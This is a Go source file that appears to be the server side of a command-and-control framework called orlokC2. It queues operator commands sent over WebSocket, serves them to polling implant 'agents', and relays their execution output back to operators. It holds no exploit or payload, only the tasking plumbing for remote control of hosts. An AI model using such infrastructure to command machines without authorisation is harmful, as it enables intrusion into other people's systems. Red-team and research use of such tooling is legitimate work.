package websocket

import (
	"encoding/json"
	"fmt"
	"net/http"
	"orlokC2_final/internal/middleware"
	"sync"
	"time"
)

// ProcessWSCommand processes WebSocket commands and queues them for agents
func ProcessWSCommand(msg Message) {
	if msg.Type == CommandMessage && msg.Command != "" {
		// Queue the command for the agent
		AgentCommands.QueueCommand(msg.Command)
	}
}

// CommandQueue stores pending commands for agents
type CommandQueue struct {
	// Queue of commands for any agent
	PendingCommands []string
	mu              sync.Mutex
}

// Global command queue
var AgentCommands = CommandQueue{
	PendingCommands: make([]string, 0),
}

// QueueCommand adds a command to the queue for any agent
func (cq *CommandQueue) QueueCommand(command string) {
	cq.mu.Lock()
	defer cq.mu.Unlock()
	cq.PendingCommands = append(cq.PendingCommands, command)
	fmt.Printf("[%s] Command queued: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		command)
}

// GetCommand retrieves and removes a command for any agent
func (cq *CommandQueue) GetCommand(agentID string) (string, bool) {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	if len(cq.PendingCommands) == 0 {
		return "", false
	}

	// Get the first command in the queue
	cmd := cq.PendingCommands[0]

	// Remove it from the queue
	cq.PendingCommands = cq.PendingCommands[1:]

	fmt.Printf("[%s] Command retrieved by agent %s: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		agentID,
		cmd)

	return cmd, true
}

// CommandEndpoint handles command requests from agents
func CommandEndpoint(w http.ResponseWriter, r *http.Request) {

	// Get the agent UUID from the request context
	agentUUID, _ := r.Context().Value(middleware.AgentUUIDKey).(string)

	fmt.Printf("[%s] Command endpoint hit by agent: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		agentUUID)

	// Check if we have a command for this agent
	cmd, exists := AgentCommands.GetCommand(agentUUID)

	// Prepare response
	response := struct {
		Command    string `json:"command,omitempty"`
		HasCommand bool   `json:"hasCommand"`
	}{
		HasCommand: exists,
	}

	if exists {
		response.Command = cmd
	}

	if exists {
		fmt.Printf("[%s] Found command for agent %s: %s\n",
			time.Now().Format("2006-01-02 15:04:05.000"),
			agentUUID,
			cmd)
		response.Command = cmd
	} else {
		fmt.Printf("[%s] No commands for agent %s\n",
			time.Now().Format("2006-01-02 15:04:05.000"),
			agentUUID)
	}

	// Send JSON response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// ResultEndpoint receives command results from agents
func ResultEndpoint(w http.ResponseWriter, r *http.Request) {
	// Get the agent UUID from the request context
	agentUUID, _ := r.Context().Value(middleware.AgentUUIDKey).(string)

	fmt.Printf("[%s] Result endpoint hit by agent: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		agentUUID)

	// Parse the incoming result
	var result struct {
		Command string `json:"command"`
		Output  string `json:"output"`
		Status  string `json:"status"`
	}

	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	fmt.Printf("[%s] Received result from agent %s:\n  Command: %s\n  Status: %s\n  Output: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		agentUUID,
		result.Command,
		result.Status,
		result.Output)

	// Forward the result to the WebSocket clients
	if GlobalWSServer != nil {
		GlobalWSServer.SendCommandResult(agentUUID, result.Command, result.Output)
	}

	// Send acknowledgment
	w.WriteHeader(http.StatusOK)
}
